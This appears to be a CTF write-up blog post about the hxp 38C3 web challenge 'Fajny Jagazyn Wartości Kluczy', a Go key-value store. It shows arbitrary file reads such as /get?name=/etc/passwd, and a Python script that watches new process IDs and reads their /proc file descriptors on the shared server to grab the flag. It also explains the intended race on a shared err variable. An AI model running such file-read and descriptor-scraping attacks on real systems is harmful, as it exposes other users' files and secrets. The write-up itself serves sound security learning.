+++
title = '🧀 hxp 38C3 CTF: Fajny Jagazyn Wartości Kluczy (Web)'
date = 2024-12-30T22:00:18+01:00
draft = false
+++

_Fajny Jagazyn Wartości Kluczy_ (Polish for _Nice Key Value Magazine_) was an easy web
challenge with 9 solves at hxp 38C3 CTF with the following description:

> A fresh web scale Key Value Store just for you 🥰

We are provided with two Go files, one implementing a "cheapskate nginx" which
spawns an instance of a key-value store upon demand which is bound to a session ID
and kept up for 180 seconds for us, the other one being the actual filesystem-backed
key-value store.

The instancer spins up the key-value store like so:

```go
func NewKV() string {
	bytes := make([]byte, 32)
	if _, err := rand.Read(bytes); err != nil {
		return ""
	}
	session := hex.EncodeToString(bytes)

	go func() {
		cmd := exec.Command("./kv")
		cmd.Env = append(os.Environ(), "SESSION="+session)

		cmd.Run()
		backends.Delete(session)
	}()

	url, err := url.Parse("http://" + session)
	if err != nil {
		return ""
	}
	proxy := httputil.NewSingleHostReverseProxy(url)
	proxy.Transport = transport

	backends.Store(session, proxy)
	return session
}
```

The key-value store (`kv.go`) then provides a quite simple get/set interface:

```go
http.HandleFunc("/get", func(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    if err = checkPath(name); err != nil {
        http.Error(w, "checkPath :(", http.StatusInternalServerError)
        return
    }

    file, err := os.Open(name)
    if err != nil {
        http.Error(w, fmt.Sprintf("Open: %s", err), http.StatusInternalServerError)
        return
    }

    data, err := io.ReadAll(io.LimitReader(file, 1024))
    if err != nil {
        http.Error(w, "ReadAll :(", http.StatusInternalServerError)
        return
    }

    w.Write(data)
})

http.HandleFunc("/set", func(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    if err = checkPath(name); err != nil {
        http.Error(w, "checkPath :(", http.StatusInternalServerError)
        return
    }

    err := os.WriteFile(name, []byte(r.URL.Query().Get("value"))[:1024], 0o777)
    if err != nil {
        http.Error(w, fmt.Sprintf("WriteFile: %s", err), http.StatusInternalServerError)
        return
    }
})
```

The flag (amongst the other challenge files) is in `/home/ctf/flag.txt`, which has the following permission structure:

``` bash
chmod 555 /home/ctf && \
chown -R root:root /home/ctf && \
chmod -R 000 /home/ctf/* && \
chmod 444 /home/ctf/flag.txt && \
chmod 005 /home/ctf/kv /home/ctf/frontend
```

Upon starting, the key-value store reads the `SESSION` from the environment variables and `chdir`'s into a per-session
directory in `/tmp/kv.<SESSION>`, where we can read and write in. (We can write in the whole of `/tmp` and `/run` even!
Isn't that awesome?)

The key-value store thus allows us to write and read data to and from the filesystem. Unfortunately, there's `checkPath`
which is enforced on both reads and writes and verifies that we aren't accessing any file with `flag` or a dot (`.`) in its name:

```go
func checkPath(path string) error {
	if strings.Contains(path, ".") {
		return fmt.Errorf("🛑 nielegalne (hacking)")
	}

	if strings.Contains(path, "flag") {
		return fmt.Errorf("🛑 nielegalne (just to be sure)")
	}

	return nil
}
```

Still, this gives us a somewhat arbitrary read and write within the challenge container, as we cannot traverse up but specify
absolute paths instead (as long as they don't contain `flag` nor a `.`). `GET /get?name=/etc/passwd` thus yields the contents of
`/etc/passwd`.

## Looking for a vulnerability

The custom instancing looked quite interesting due to the unusual spawning of the `kv` process (it could have been a
Goroutine, after all). The `httputil.NewSingleHostReverseProxy` does have some pitfalls that can lead to unwanted behavior,
but nothing of particular interest to this challenge. But especially since the input validation happens in the "backend" store,
which rules out request-smuggling-type vulnerabilities to some extent, this part was deemed not to be too interesting after an
initial analysis.

As for `kv.go`, we didn't notice anything too suspicious (more on that later, lol), even after looking at it with quite a few well-versed
web players for a fair bit of time. Knowing the goal is to read `/home/ctf/flag.txt`, we thought about the following:
- Get an `open(2)` gadget without the `flag`/`.` input validation somewhere to get our process to open the flag file, and then race `/proc/self/fd`
against this using the `/get` endpoint, which would allow us to get a readable reference to `/home/ctf/flag.txt` that would pass the validations.
- Utilize the anonymous pipes the Go runtime opens (you'll notice these when you look in `/proc/self/fd` of a Go binary's process). There are some pointers
being passed around there, which can be seen by `strace`'ing the process, but it seems to be used for non-critical message passing purposes of the runtime only.
Still, this is probably an interesting vector to look at in more detail, as past research [^1] showed that language runtime sockets are an interesting target to
leverage file writes into RCE.
- Find any other way of getting a file write to RCE in the environment, but as it's a plain Debian container without any service manager or the like and a very
minimal process tree, this was also deemed to be quite unlikely.

After wasting quite some time on this, we concluded that we're probably just very blind (we were!), as this was an easy challenge, after all.

## 🧀🧀🧀!

About 24 hours into the CTF, with the challenge being solved twice, we thought that there will probably be other teams to solve this challenge before the CTF ends.
As we had an arbitrary read (under the given constraints), allowing us to read the entire procfs, and the challenge server being shared among the teams,
we came to realize that we could just monitor the procfs and read the FDs of new processes to just snag a reference to the flag file if another team would solve the challenge. After shortly clarifying with the hxp team to verify that this would not be regarded as an attack to the CTF infrastructure (thanks hxp team for allowing us!),
we just implemented our approach:

```py
import requests, time, threading, os

HOST = "http://49.13.169.154:8088"
TIMEOUT = 180

last_pid = 0

s = requests.Session()

def worker(pid):
    now = time.time()
    s.get(HOST)

    time.sleep(1 / 10)

    n = 3
    while True:
        try:
            r = s.get(HOST + "/get", params={
                "name": f"/proc/{pid}/fd/{n}",
                })
            if "hxp{" in r.text:
                print(r.text)
                with open(f"flag_{pid}.txt", "w+") as f:
                    f.write(r.text)
                os.exit(0)
            if "Open :(" not in r.text:
                print(f"[{pid}] {n} :: {r.text}")
                with open(f"output.txt", "a+") as f:
                    f.write(f"[{pid}] {n} :: {r.text}\n")
            n += 1
            if n > 100:
                n = 3
                continue
            if time.time() - now > TIMEOUT:
                print(f"[{pid}] TIMEOUT")
                return
            time.sleep(1 / 10)
        except Exception as e:
            continue

while True:
    s.get(HOST)

    assert "session" in s.cookies

    time.sleep(1 / 10)

    r = s.get(HOST + "/get", params={
        "name": "/proc/sys/kernel/ns_last_pid",
        })
    try:
        pid = int(r.text.strip())
    except:
        print(f"[-] Error: {r.text}")
        continue
    if pid == last_pid:
        continue
    print(f"[*] PID changed {last_pid} -> {pid}")
    last_pid = pid
    for i in range(5):
        threading.Thread(target=worker, args=(pid+i,)).start()
```

This utilized `/proc/sys/kernel/ns_last_pid`, which contains the last used PID as an oracle to when a new instance of the kv-store would be
spawned (which resulted in about 5 new processes), and then, when a change is detected in the monitoring, would spawn a worker thread for each of the new PIDs to
periodically check all of the open FDs of the new processes, and exit if the flag would be found.

And indeed, this yielded the flag after about 10 minutes of running:

> `hxp{Another_world-class_product_from_the_former_search_engine_company}`

As no team had solved this within the timeframe, it had to be a periodic solve script of the hxp team, which was later confirmed to us.

While this wasn't very satisfying, as we still hadn't found the vulnerability in an easy(!) challenge, it allowed us to go on with other challenges.

## The intended solution

The vulnerability was quite subtle, yet interesting. Writing quite some Go in my day job, I was ashamed to not have seen it earlier.

TL;DR: The assignment to the `err` variable for `checkPath` within the route handlers used `=` (contrary to `:=`), resulting in a re-use of the
variable from the outer function's (i.e. `main`'s) scope, making it effectively global and race-able between reads that would and would not pass the check:

```go
if err = checkPath(name); err != nil {
    http.Error(w, "checkPath :(", http.StatusInternalServerError)
    return
}
```

A proper explanation and solve script in the writeup of the challenge author. [^2]

All-in-all, this was a very interesting challenge. Even though having very little attack surface, the vulnerability still didn't stood out to experienced web
players, showing that such critical code paths should be analyzed with utmost care (and that you probably shouldn't serve a key-value store for everybody on your
full file system, lol).

Thanks for reading!

[^1]: https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/
[^2]: https://hxp.io/blog/114/hxp-38C3-CTF-Fajny-Jagazyn-Wartoci-Kluczy/
